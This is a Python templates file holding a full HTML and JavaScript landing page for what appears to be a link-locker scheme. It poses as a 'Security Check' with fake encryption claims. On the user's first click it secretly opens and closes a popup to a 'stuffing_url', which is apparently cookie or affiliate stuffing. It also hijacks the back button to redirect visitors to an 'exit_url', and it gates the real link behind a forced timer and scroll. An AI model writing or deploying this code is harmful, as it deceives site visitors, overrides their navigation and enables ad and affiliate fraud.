# templates.py

LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Handshake</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style> body { font-family: 'Inter', sans-serif; background: #fff; scroll-behavior: smooth; } .bar { width: 0%; transition: width 0.5s ease; } </style>
</head>
<body class="text-slate-800">
    <div class="max-w-xl mx-auto pt-10 px-6">
        <div class="bg-white rounded-[2.5rem] p-8 shadow-2xl shadow-blue-50 border border-slate-50 text-center mb-8">
            <div class="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl shadow-inner">🛡️</div>
            <h1 class="text-2xl font-bold tracking-tight">Security Check</h1>
            <p class="text-slate-400 text-xs mt-2" id="header_msg">Preparing your secure download node...</p>
            <div id="timer_box" class="mt-6 bg-slate-50 p-6 rounded-3xl border border-slate-100">
                <div class="w-full bg-slate-200 h-1 rounded-full overflow-hidden mb-3">
                    <div id="progress" class="bar h-full bg-blue-600"></div>
                </div>
                <p id="t_text" class="text-[10px] font-bold text-blue-500 uppercase tracking-widest">Wait 15s</p>
            </div>
        </div>

        <div class="px-2 pb-32">
            <h2 class="text-lg font-black text-slate-800 mb-4">{{ article.title }}</h2>
            <div class="text-slate-500 text-sm leading-relaxed space-y-4">
                <p>{{ article.body }}</p>
                <div class="h-40 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-100 flex items-center justify-center text-slate-300 text-[10px] uppercase italic tracking-widest">Handshake Encryption Active</div>
                <p>To finalize the process, please scroll to the end of this security audit and click the unlock button.</p>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 w-full p-6 bg-gradient-to-t from-white via-white to-transparent">
            <div id="instr" class="max-w-md mx-auto text-center p-3 bg-blue-50 text-blue-600 rounded-2xl text-[10px] font-bold uppercase mb-2 hidden animate-bounce">⬇️ Scroll to bottom</div>
            <div id="btn_area" class="max-w-md mx-auto hidden">
                <button onclick="finalDownload()" class="block w-full bg-blue-600 hover:bg-blue-700 text-white py-5 rounded-2xl font-bold text-center shadow-xl shadow-blue-200 transition-all active:scale-95">Access Link Now</button>
            </div>
        </div>
    </div>

    <script>
        let t=15, isReady=false, isBottom=false, isInjected=false;
        const s_url = "/redirect?url=" + encodeURIComponent("{{ s.stuffing_url }}");
        const e_url = "/redirect?url=" + encodeURIComponent("{{ s.exit_url }}");

        // 1. CLICK TRIGGERED INJECTION
        function start() {
            if(!isInjected && "{{ s.stuffing_url }}") {
                const pop = window.open(s_url, '_blank');
                if(pop) { window.focus(); setTimeout(()=> {try{pop.close();}catch(e){}}, 2000); }
                isInjected = true;
            }
        }
        document.addEventListener('click', start, {once:true});
        document.addEventListener('touchstart', start, {once:true});

        // 2. TIMER LOGIC
        const iv = setInterval(() => {
            t--;
            document.getElementById('progress').style.width = ((15-t)/15)*100 + "%";
            document.getElementById('t_text').innerText = "Wait " + t + "s";
            if(t <= 0) {
                clearInterval(iv); isReady = true;
                document.getElementById('timer_box').style.opacity = "0.5";
                document.getElementById('instr').classList.remove('hidden');
                check();
            }
        }, 1000);

        // 3. SCROLL LOGIC
        window.onscroll = () => {
            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 150) {
                isBottom = true; check();
            }
        };

        function check() {
            if(isReady && isBottom) {
                document.getElementById('instr').classList.add('hidden');
                document.getElementById('btn_area').classList.remove('hidden');
                document.getElementById('header_msg').innerText = "Handshake Complete.";
            }
        }

        function finalDownload() {
            // Disable back hijack only for this successful click
            window.onpopstate = null;
            window.location.href = "/redirect?url=" + encodeURIComponent("{{ target_url }}");
        }

        // 4. BACK-BUTTON HIJACK (FIXED)
        (function() {
            if(!e_url) return;
            history.pushState(null, null, location.href);
            window.onpopstate = function() {
                window.location.replace("/redirect?url=" + encodeURIComponent("{{ s.exit_url }}"));
            };
        })();
    </script>
</body>
</html>
"""

ADMIN_HTML = """ <!-- كود لوحة الإدارة (نفس السابق) --> """
